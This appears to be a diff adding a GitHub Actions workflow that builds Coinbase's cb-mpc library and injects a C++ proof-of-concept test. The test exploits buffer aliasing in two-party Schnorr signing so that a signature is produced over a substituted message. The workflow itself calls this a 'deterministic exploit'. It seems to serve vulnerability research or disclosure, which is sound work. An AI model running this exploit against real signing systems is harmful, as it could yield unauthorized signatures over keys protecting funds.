@@ -1,0 +1,83 @@
+name: CBMPC Schnorr Inline Message Substitution V40
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/cbmpc-schnorr-inline-message-substitution-v40.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  verdict:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 45
+    steps:
+      - name: Clone current cb-mpc HEAD
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone https://github.com/coinbase/cb-mpc.git cb-mpc >/dev/null 2>&1
+          cd cb-mpc
+          git checkout fdbb60346757271d5e0241f417e55dc8f289573c >/dev/null 2>&1
+          git submodule update --init --recursive >/dev/null 2>&1
+      - name: Add public Schnorr2P alias-substitution PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          p=Path('cb-mpc/tests/utils/local_network/channel.cpp')
+          p.write_text(p.read_text().replace('    delete queue.front();','    test_message_buffer_t::free(queue.front());'))
+          PY
+          cat >> cb-mpc/tests/unit/api/test_schnorr2pc.cpp <<'CPP'
+
+          #include <fstream>
+
+          TEST(ApiSchnorr2pc, InlineMessageOutputAliasSubstitutionVerdictV40) {
+            auto c1=std::make_shared<mpc_net_context_t>(0); auto c2=std::make_shared<mpc_net_context_t>(1);
+            std::vector<std::shared_ptr<mpc_net_context_t>> peers={c1,c2}; c1->init_with_peers(peers); c2->init_with_peers(peers);
+            local_api_transport_t t1(c1),t2(c2);
+            const coinbase::api::job_2p_t job1{party_t::p1,"p1","p2",t1};
+            const coinbase::api::job_2p_t job2{party_t::p2,"p1","p2",t2};
+            buf_t key1,key2; error_t rv1=UNINITIALIZED_ERROR,rv2=UNINITIALIZED_ERROR;
+            run_2pc(c1,c2,
+              [&]{return coinbase::api::schnorr_2p::dkg(job1,curve_id::secp256k1,key1);},
+              [&]{return coinbase::api::schnorr_2p::dkg(job2,curve_id::secp256k1,key2);},rv1,rv2);
+            ASSERT_EQ(rv1,SUCCESS); ASSERT_EQ(rv2,SUCCESS);
+            buf_t pub; ASSERT_EQ(coinbase::api::schnorr_2p::get_public_key_compressed(key1,pub),SUCCESS);
+            coinbase::crypto::ecc_point_t Q; ASSERT_EQ(Q.from_bin(coinbase::crypto::curve_secp256k1,pub),SUCCESS);
+
+            buf_t victim(32); for(int i=0;i<32;++i) victim[i]=static_cast<uint8_t>(0x70+i);
+            const buf_t original=victim; mem_t victim_view=victim;
+            buf_t zeros(32); for(int i=0;i<32;++i) zeros[i]=0;
+            buf_t sig2;
+            run_2pc(c1,c2,
+              [&]{return coinbase::api::schnorr_2p::sign(job1,key1,victim_view,victim);},
+              [&]{return coinbase::api::schnorr_2p::sign(job2,key2,zeros,sig2);},rv1,rv2);
+            const error_t zero_verify=(victim.size()==64)?coinbase::crypto::bip340::verify(Q,zeros,victim):E_GENERAL;
+            const error_t original_verify=(victim.size()==64)?coinbase::crypto::bip340::verify(Q,original,victim):E_GENERAL;
+            const bool substituted=rv1==SUCCESS&&rv2==SUCCESS&&victim.size()==64&&zero_verify==SUCCESS&&original_verify!=SUCCESS;
+            std::ofstream out("/code/v40-verdict.txt",std::ios::trunc);
+            out<<"commit=fdbb60346757271d5e0241f417e55dc8f289573c rv1="<<rv1<<" rv2="<<rv2
+               <<" sig_size="<<victim.size()<<" zero_verify="<<zero_verify
+               <<" original_verify="<<original_verify<<" substituted="<<(substituted?1:0)<<"\n";
+          }
+          CPP
+      - name: Run release deterministic exploit
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd cb-mpc
+          make image >/tmp/image-build.log 2>&1
+          set +e
+          timeout 38m docker run --rm -v "$PWD":/code -t cb-mpc bash -lc 'make test filter=ApiSchnorr2pc.InlineMessageOutputAliasSubstitutionVerdictV40' >/tmp/test.log 2>&1
+          status=$?
+          set -e
+          echo "test_exit=$status"
+          if [ -f v40-verdict.txt ]; then cat v40-verdict.txt; else echo verdict_missing=1; fi
+          sub=$(sed -n 's/.*substituted=\([0-9][0-9]*\).*/\1/p' v40-verdict.txt 2>/dev/null || true)
+          if [ "${sub:-0}" -eq 1 ]; then echo 'SCHNORR_DETERMINISTIC_UNAUTHORIZED_SIGNATURE_CANDIDATE=1'; exit 2; fi
+          if [ "$status" -ne 0 ]; then echo V40_TEST_OR_BUILD_FAILURE=1; tail -n 140 /tmp/test.log; exit 1; fi
+          echo SCHNORR_DETERMINISTIC_UNAUTHORIZED_SIGNATURE_CANDIDATE=0
